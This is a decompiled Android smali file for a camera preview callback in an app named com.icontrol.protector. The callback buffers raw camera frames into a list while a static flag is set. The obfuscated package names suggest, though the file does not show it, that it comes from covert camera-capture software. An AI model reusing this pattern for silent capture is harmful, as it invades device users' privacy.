.class Lcom/icontrol/protector/CameraCap$b;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/hardware/Camera$PreviewCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/CameraCap;->surfaceChanged(Landroid/view/SurfaceHolder;III)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/icontrol/protector/CameraCap;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/CameraCap;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/CameraCap$b;->a:Lcom/icontrol/protector/CameraCap;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPreviewFrame([BLandroid/hardware/Camera;)V
    .locals 1

    if-nez p1, :cond_0

    return-void

    :cond_0
    :try_start_0
    sget-object p2, Lcom/icontrol/protector/CameraCap;->p:Lntidisestablish/neumonoul/floccinaucinih/m70;

    if-eqz p2, :cond_1

    sget-boolean p2, Lcom/icontrol/protector/CameraCap;->i:Z

    const/4 v0, 0x1

    if-ne p2, v0, :cond_1

    iget-object p2, p0, Lcom/icontrol/protector/CameraCap$b;->a:Lcom/icontrol/protector/CameraCap;

    invoke-static {p2}, Lcom/icontrol/protector/CameraCap;->d(Lcom/icontrol/protector/CameraCap;)Lntidisestablish/neumonoul/floccinaucinih/ks;

    move-result-object p2

    if-eqz p2, :cond_1

    iget-object p2, p0, Lcom/icontrol/protector/CameraCap$b;->a:Lcom/icontrol/protector/CameraCap;

    invoke-static {p2}, Lcom/icontrol/protector/CameraCap;->g(Lcom/icontrol/protector/CameraCap;)Ljava/util/List;

    move-result-object p2

    invoke-interface {p2}, Ljava/util/List;->size()I

    move-result p2

    const/16 v0, 0xf

    if-gt p2, v0, :cond_1

    invoke-static {}, Lcom/icontrol/protector/CameraCap;->f()Ljava/lang/Object;

    move-result-object p2

    monitor-enter p2
    :try_end_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    iget-object v0, p0, Lcom/icontrol/protector/CameraCap$b;->a:Lcom/icontrol/protector/CameraCap;

    invoke-static {v0}, Lcom/icontrol/protector/CameraCap;->g(Lcom/icontrol/protector/CameraCap;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, p1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    monitor-exit p2

    goto :goto_0

    :catchall_0
    move-exception p1

    monitor-exit p2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw p1
    :try_end_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method
